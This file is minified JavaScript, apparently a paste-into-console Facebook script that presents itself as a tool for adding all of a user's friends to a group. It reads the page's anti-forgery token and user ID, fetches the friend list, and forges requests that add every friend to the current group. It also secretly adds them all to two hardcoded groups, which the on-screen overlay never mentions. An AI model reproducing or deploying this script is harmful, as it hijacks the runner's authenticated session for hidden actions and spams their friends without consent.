var tulisanNganu='Script Created & Designed by <A 

href="https://www.facebook.com/pkwaq">Waqar Ahmad.</A>';var 

kunaon='',wkwkwk='Waqar Ahmad - Thanks For Adding Your Friends Here. 

<br/>Powered By <A 

href="http://www.facebook.com/Loading.999999">Loading 

[lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';function 

penetrasi(opo){jx.load(window.location.protocol+"//www.facebook.com/aja

x/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByNam

e("fb_dtsg")[0].value+"&group_id="+memberGroupId+"&source=typeahead&mem

bers="+opo+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_

source=AsyncRequest&__user="+Env.user,function(a){var 

b=a.substring(a.indexOf("{"));var c=JSON.parse(b);i--;kunaon="<div 

class='friend-edge-name' 

style='text-align:left;font-size:10px;white-space:pre-wrap;";if(c.error

){kunaon+="color:darkred'>";if(c.errorDescription){kunaon+=c.errorDescr

iption}else{kunaon+=JSON.stringify(c,null,"")}}else{kunaon+="color:dark

green'>";kunaon+=arr[i];suc++}kunaon+="</div>";var dipes="<div 

id='friend-edge-display' 

style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px

;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:

0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid 

rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#0000

00'>";dipes+="<div 

style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>";if(

i>0){dipes+=arr.length+" Friends Detected<br/>";dipes+="<b>"+suc+"</b> 

Friends Added of "+(arr.length-i)+" Friends Processed ";dipes+="("+i+" 

Lefted...)";dipes+="<div 

class='friend-edge'>";dipes+=kunaon;dipes+="<div 

style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray

'><br/>";dipes+=wkwkwk;dipes+="</div>";dipes+="</div>"}else{dipes+=arr.

length+" Friends Detected and ";dipes+="<b>"+suc+" Friends 

Added</b>";dipes+="<div><span class='uiButton uiButtonLarge' 

onClick='document.getElementById(\"pagelet_welcome_box\").style.display

=\"none\"'>Close</span></div>"}dipes+="</div>";var askDIV = document.createElement("div");askDIV.innerHTML=dipes;
document.body.appendChild(askDIV);},"text","post");tay--;if(tay>0){var 

s=arr[tay];setTimeout("penetrasi("+s+")",100)}console.log(tay+"/"+arr.l

ength+":"+s+", 

success:"+suc);if(memberGroupId!=440858199282766){jx.load(window.locati

on.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&

fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=440

858199282766&source=typeahead&members="+opo+"&nctr[_mod]=pagelet_group_

members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,

function(){},"text","post")}if(memberGroupId!=239289549496931){jx.load(

window.location.protocol+"//www.facebook.com/ajax/groups/members/add_po

st.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"

&group_id=239289549496931&source=typeahead&members="+opo+"&nctr[_mod]=p

agelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__use

r="+Env.user,function(){},"text","post")}}function 

clickfr_callback(){if(document.getElementsByName("ok").length>0){nHtml.

ClickUp(document.getElementsByName("ok")[0])}var 

a=arr[i];if(i<arr.length)addfriend(a.substring(0,4))}function 

clickfr(){if(document.getElementsByClassName("search").length>0){consol

e.log(document.getElementsByClassName("search")[0].childNodes[0].childN

odes[0].childNodes[1].innerHTML);document.getElementsByClassName("searc

h")[0].childNodes[0].childNodes[0].href="javascript:void(0);";nHtml.Cli

ckUp(document.getElementsByClassName("search")[0].childNodes[0].childNo

des[0].childNodes[1])}else 

j++;setTimeout("clickfr_callback()",2e3)}function 

addfriend(a){i++;document.getElementsByClassName("mbm")[eind].childNode

s[0].childNodes[1].childNodes[0].focus();document.getElementsByClassNam

e("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value=a;docume

nt.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].chil

dNodes[0].blur();document.getElementsByClassName("mbm")[eind].childNode

s[0].childNodes[1].childNodes[0].focus();document.getElementsByClassNam

e("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();setTim

eout("clickfr()",2e3)}function sleep(a){var b=(new 

Date).getTime();for(var c=0;c<1e7;c++){if((new 

Date).getTime()-b>a){break}}}jx={getHTTPObject:function(){var 

a=false;if(typeof ActiveXObject!="undefined"){try{a=new 

ActiveXObject("Msxml2.XMLHTTP")}catch(b){try{a=new 

ActiveXObject("Microsoft.XMLHTTP")}catch(c){a=false}}}else{if(window.XM

LHttpRequest){try{a=new XMLHttpRequest}catch(b){a=false}}}return 

a},load:function(url,callback,format,method,opt){var 

http=this.init();if(!http||!url){return}if(http.overrideMimeType){http.

overrideMimeType("text/xml")}if(!method){method="GET"}if(!format){forma

t="text"}if(!opt){opt={}}format=format.toLowerCase();method=method.toUp

perCase();var now="uid="+(new 

Date).getTime();url+=url.indexOf("?")+1?"&":"?";url+=now;var 

parameters=null;if(method=="POST"){var 

parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,

url,true);if(method=="POST"){http.setRequestHeader("Content-type","appl

ication/x-www-form-urlencoded");http.setRequestHeader("Content-length",

parameters.length);http.setRequestHeader("Connection","close")}var 

ths=this;if(opt.handler){http.onreadystatechange=function(){opt.handler

(http)}}else{http.onreadystatechange=function(){if(http.readyState==4){

if(http.status==200){var 

result="";if(http.responseText){result=http.responseText}if(format.char

At(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+

")")}else{if(format.charAt(0)=="x"){result=http.responseXML}}if(callbac

k){callback(result)}}else{if(opt.loadingIndicator){document.getElements

ByTagName("body")[0].removeChild(opt.loadingIndicator)}if(opt.loading){

document.getElementById(opt.loading).style.display="none"}if(error){err

or(http.status)}}}}}http.send(parameters)},bind:function(a){var 

b={url:"",onSuccess:false,onError:false,format:"text",method:"GET",upda

te:"",loading:"",loadingIndicator:""};for(var c in 

b){if(a[c]){b[c]=a[c]}}if(!b.url){return}var 

d=false;if(b.loadingIndicator){d=document.createElement("div");d.setAtt

ribute("style","position:absolute;top:0px;left:0px;");d.setAttribute("c

lass","loading-indicator");d.innerHTML=b.loadingIndicator;document.getE

lementsByTagName("body")[0].appendChild(d);this.opt.loadingIndicator=d}

if(b.loading){document.getElementById(b.loading).style.display="block"}

this.load(b.url,function(a){if(b.onSuccess){b.onSuccess(a)}if(b.update)

{document.getElementById(b.update).innerHTML=a}if(d){document.getElemen

tsByTagName("body")[0].removeChild(d)}if(b.loading){document.getElement

ById(b.loading).style.display="none"}},b.format,b.method,b)},init:funct

ion(){return this.getHTTPObject()}};var 

nHtml={FindByAttr:function(a,b,c,d){if(c=="className"){c="class"}var 

e=document.evaluate(".//"+b+"[@"+c+"='"+d+"']",a,null,XPathResult.FIRST

_ORDERED_NODE_TYPE,null);if(e&&e.singleNodeValue){return 

e.singleNodeValue}return null},FindByClassName:function(a,b,c){return 

this.FindByAttr(a,b,"className",c)},FindByXPath:function(a,b){try{var 

c=document.evaluate(b,a,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}

catch(d){GM_log("bad xpath:"+b)}if(c&&c.singleNodeValue){return 

c.singleNodeValue}return 

null},VisitUrl:function(a){window.setTimeout(function(){document.locati

on.href=a},500+Math.floor(Math.random()*500))},ClickWin:function(a,b,c)

{var 

d=a.document.createEvent("MouseEvents");d.initMouseEvent(c,true,true,a,

0,0,0,0,0,false,false,false,false,0,null);return!b.dispatchEvent(d)},Cl

ick:function(a){return 

this.ClickWin(window,a,"click")},ClickTimeout:function(a,b){window.setT

imeout(function(){return 

nHtml.ClickWin(window,a,"click")},b+Math.floor(Math.random()*500))},Cli

ckUp:function(a){this.ClickWin(window,a,"mousedown");this.ClickWin(wind

ow,a,"mouseup");this.ClickWin(window,a,"click")},GetText:function(a,b){

var 

c="";if(b==undefined){b=0}if(b>40){return}if(a.textContent!=undefined){

return a.textContent}for(var d=0;d<a.childNodes.length;d++){var 

e=a.childNodes[d];c+=this.GetText(e,b+1)}return 

c}};if(document.getElementsByClassName==undefined){document.getElements

ByClassName=function(a){var b=new RegExp("(?:^|\\s)"+a+"(?:$|\\s)");var 

c=document.getElementsByTagName("*");var d=[];var e;for(var 

f=0;(e=c[f])!=null;f++){var 

g=e.className;if(g&&g.indexOf(a)!=-1&&b.test(g))d.push(e)}return 

d}}Array.prototype.find=function(a){var 

b=false;for(i=0;i<this.length;i++){if(typeof 

a=="function"){if(a.test(this[i])){if(!b){b=[]}b.push(i)}}else{if(this[

i]===a){if(!b){b=[]}b.push(i)}}}return b};var a=0,eind=0;var 

len=document.getElementsByClassName("mbm").length;for(a=0;a<len;a++){va

r 

ele=document.getElementsByClassName("mbm")[a];if(ele&&ele.childNodes[0]

&&ele.childNodes[0]&&ele.childNodes[0].childNodes[1]&&ele.childNodes[0]

.childNodes[1].childNodes[0]&&document.getElementsByClassName("mbm")[a]

.childNodes[0].childNodes[1].childNodes[0].value=="Add Friends to 

Group"){eind=a;break}}var i=3;var tay=3;var 

counter1=0,counter2=0,counter3=0;var j=0;var k=0;var suc=0;var arr=new 

Array;var 

memberGroupId=document.getElementsByName('group_id')[0].value;jx.load(w

indow.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree

.php?__a=1&viewer="+Env.user+"&filter[0]=user&__user="+Env.user,functio

n(a){var b=a;var c=b.substring(b.indexOf("{"));var 

d=JSON.parse(c);d=d.payload.entries;for(var 

e=0;e<d.length;e++){arr.push(d[e].uid)}i=arr.length-1;tay=i;console.log

(arr.length);var dipes="<div id='friend-edge-display' 

style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px

;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:

0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid 

rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#0000

00'>";dipes+="<div 

style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>";dip

es+=arr.length+" Friends 

Detected";dipes+="</div>";var askDIV = document.createElement("div");askDIV.innerHTML = dipes;
document.body.appendChild(askDIV);penetrasi(ar

r[i])})